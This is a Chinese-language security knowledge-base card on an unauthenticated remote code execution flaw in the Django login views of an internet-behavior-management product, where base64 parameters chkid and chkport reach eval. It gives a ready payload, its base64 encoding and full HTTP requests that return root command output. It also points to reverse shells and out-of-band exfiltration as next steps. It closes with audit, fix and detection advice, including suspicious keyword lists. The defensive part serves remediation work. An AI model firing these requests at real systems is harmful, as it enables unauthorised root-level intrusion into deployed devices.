---
id: web-python-django-login-eval-base64-user-input-rce
title: Django 登录接口对 base64 参数 eval 导致未授权 RCE（chkid/chkport）
type: scenario
domain: web
path: web/python
technique: django-login-eval-base64-user-input
tags:
- python
- django
- eval
- code-execution
- rce
- base64
- unauth
- web
severity: critical
confidence: high
status: verified
created: '2026-11-05'
updated: '2026-11-05'
verification:
  verified_by: verifier-V58
  verified_at: '2026-11-05T08:49:22+08:00'
  notes: 已对照原文与图01-11核对：vLogin.py index() 第44行 dic=eval(infos)，len(hData)==3+chkid+b64decode+子串检查与图04一致；原文请求 ?title=ABC&oIp=XXX&chkid=... 与图06一致；sendDoLogin 的 chkport 入口、eval 与修复为 evalTojsonloads 与图07-10一致；payload base64 解码逐字比对一致，响应含 uid=0(root)。未验证点：原文未注明 Python 版本，b64decode 返回 str/bytes 未验证（若为 Python3 原生 b64decode 则 'sUserCode' in bytes 会 TypeError，实际目标应使用返回 str 的自定义解码）；PoC 未本机执行；frontmatter 无 sources/source_url。
url: /docs/web/python/web-python-django-login-eval-base64-user-input-rce/
draft: false
kb_aliases:
- 上网行为管理系统前台 RCE
- eval(infos) RCE
- chkid 参数 RCE
- chkport 参数 RCE
- Django eval 代码执行
- base64 eval 注入
---

## 一句话结论

Django 登录校验视图把客户端可控的 `chkid`/`chkport` 参数做 base64 解码后直接 `eval()`，且入口位于登录流程、无需认证；构造既满足 `'sUserCode' in infos and 'sPwd' in infos` 又执行系统命令的表达式，即可未授权执行任意 Python 代码，原文在目标上直接返回 `uid=0(root)`。

## 原理

- **危险汇聚点**：`vLogin.py` 的 `index()` 中 `infos = b64decode(chkid)`，随后 `if 'sUserCode' in infos and 'sPwd' in infos: dic = eval(infos)`。`eval()` 接受 `bytes`，会把解码后的内容当作 Python 表达式求值，而不是当作 JSON/字典解析，因此任意表达式都能执行。
- **入口无认证**：`index()` 对应站点根路由 `/`，是登录页/登录校验流程的一部分；代码在验证用户名口令之前就执行了 `eval`，所以攻击者不需要任何账号或 token。
- **参数门槛可绕过**：执行 `eval` 前只要求 `infos` 字节串中同时出现 `'sUserCode'` 和 `'sPwd'` 两个子串。攻击者把这两个词写进 Python 注释（`# sUserCodexsPwd`），既满足字符串包含检查，又不影响表达式执行。
- **返回结果可见**：`eval` 的返回值随后被当作字典取 `sUserCode`/`sPwd`，正常字典表达式才能继续登录逻辑；若只是想执行命令，可用 `os.system("id") or __import__("subprocess").check_output("id", shell=True).decode()`：`system` 成功返回 0（假值），`or` 右侧继续执行并用 `check_output` 把命令输出作为表达式结果返回，随后页面把结果渲染/回显出来（原文截图响应中出现 `uid=0(root) gid=0(root)`）。
- **同类第二处**：`sendDoLogin()` 用参数 `chkport` 取 base64 内容，同样 `chkstr = b64decode(chkid)` 后 `eval(chkstr)`，检查逻辑相同，访问 `/xxx/sendDoLogin` 即可触发；同一 payload 可直接复用。这说明问题是“登录相关代码普遍用 eval 解析客户端数据”的模式，而非单点。
- **修复方式**：原文明示修复是删除 `eval`，改用 `json.loads`/`cUtil.evaltojsonloads`（并处理引号替换），即把“代码求值”降级为“数据解析”。

## 触发条件

- 目标为使用该 Django 登录代码的上网行为管理系统（Python 3；`eval` 接受 bytes）。
- 登录相关路由 `/`、`/xxx/sendDoLogin` 对攻击者可达，且无需先登录。
- 代码路径为：请求参数 → base64 解码 → 子串检查 → `eval`。
- 原文实际请求只需 `GET /?title=ABC&oIp=XXX&chkid=<base64>`：`request.GET` 恰好 3 个键，其中包含 `chkid`；`title`/`oIp`/`nLang` 是可选读取项，`nLang` 不是必须。第二个接口用 `chkport` 承载 base64。

## 利用步骤

1. 编写满足子串检查的 Python 表达式，例如：
   `__import__("os").system("id") or __import__("subprocess").check_output("id", shell=True).decode() #sUserCodexsPwd`
2. 对表达式做 base64 编码，得到 `chkid`（或 `chkport`）的值。
3. 对第一个接口发送 GET：`/?title=ABC&oIp=XXX&chkid=<base64>`，三个参数键即可满足 `len(hData)==3`。
4. 对第二个接口发送 GET/POST：`/xxx/sendDoLogin?chkport=<base64>`。
5. 从响应中读取命令输出；若要进一步利用，可换成反弹 shell、写文件或读取配置的表达式。

## PoC

原文 payload（表达式）：

```python
__import__("os").system("id") or __import__("subprocess").check_output("id", shell=True).decode() #sUserCodexsPwd
```

base64 编码后：

```text
X19pbXBvcnRfXygib3MiKS5zeXN0ZW0oImlkIikgb3IgX19pbXBvcnRfXygic3VicHJvY2VzcyIpLmNoZWNrX291dHB1dCgiaWQiLCBzaGVsbD1UcnVlKS5kZWNvZGUoKSAjc1VzZXJDb2RleHNQd2Q=
```

请求示例：

```http
GET /?title=ABC&oIp=XXX&chkid=X19pbXBvcnRfXygib3MiKS5zeXN0ZW0oImlkIikgb3IgX19pbXBvcnRfXygic3VicHJvY2VzcyIpLmNoZWNrX291dHB1dCgiaWQiLCBzaGVsbD1UcnVlKS5kZWNvZGUoKSAjc1VzZXJDb2RleHNQd2Q= HTTP/1.1
```

```http
GET /xxx/sendDoLogin?chkport=X19pbXBvcnRfXygib3MiKS5zeXN0ZW0oImlkIikgb3IgX19pbXBvcnRfXygic3VicHJvY2VzcyIpLmNoZWNrX291dHB1dCgiaWQiLCBzaGVsbD1UcnVlKS5kZWNvZGUoKSAjc1VzZXJDb2RleHNQd2Q= HTTP/1.1
```

原文响应（HTML 转义）中出现：

```text
uid=0(root) gid=0(root) 组=0(root)
```

## 变体与关联

- **同一模式的多入口**：原文通过全局搜索 `eval(` 找到登录文件中的多处调用，两个登录接口均可 RCE；修复时逐个删除 eval。
- **子串检查绕过**：任何要求 payload 包含固定关键字的检查都可用注释（`#`）、字符串常量或变量名满足；本卡的 `#sUserCodexsPwd` 是最小做法。
- **表达式选型**：`os.system` 返回码不可见时用 `subprocess.check_output(...).decode()` 取回显；无回显场景可改为 DNS/HTTP 外带、写文件或反弹 shell。
- **关联**：Python 代码执行/WAF 绕过、SSTI、反序列化等同类 RCE 卡；共同点是用户输入最终进入代码求值语义，而不是数据解析语义。

## 检测与防御

- **代码审计**：全局搜索 `eval(`、`exec(`、`compile(`、`pickle.loads`，重点看登录/认证/设备上报等未授权入口；发现客户端数据直接 base64 解码后 eval 的代码立即整改。
- **修复**：用 `json.loads`、`ast.literal_eval` 或固定 schema 解析；原文修复即删除 eval、改用 JSON 解析函数。
- **运行时检测**：Web 进程（uwsgi/gunicorn）异常派生 `id`、`sh`、`curl` 等子进程；请求参数出现超长 base64、`__import__`、`subprocess`、`os.system` 等关键字；WAF 应对 base64 参数解码后再检测，而不是只看编码后的密文。
- **防御**：登录接口限速与来源限制、最小权限运行 Web 服务、禁用不必要的调试/命令执行组件；对 Python 代码执行类漏洞，修复根因（去掉 eval）而非仅加关键字黑名单。
